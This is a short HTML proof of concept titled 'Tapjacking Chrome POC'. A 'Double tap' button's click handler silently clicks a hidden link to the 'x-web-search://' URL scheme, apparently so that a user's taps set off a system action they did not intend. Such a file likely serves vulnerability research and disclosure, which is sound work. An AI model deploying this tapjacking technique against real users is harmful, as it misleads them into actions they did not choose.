
<!DOCTYPE html>
<html>
<head>
  <title>Tapjacking Chrome POC</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <style>
    body {
      margin: 0;
      height: 100vh;
      overflow: hidden;
      user-select: none;
    }


    #first {
      position: absolute;
      top: 70%;
      left: 65%;
      transform: translate(-50%, -50%);
      font-size: 40px;
    }
  </style>
  <script>

    function handleClick() {
      
        document.getElementById("trigger").click();

    }


  </script>
</head>
<body>
  <center id="first" style="padding: 15px;">
    <button onclick="handleClick()">Double tap</button>
  </center>
  <a href="x-web-search://" id="trigger" onclick="" hidden>Test</a>

</body>

</html>
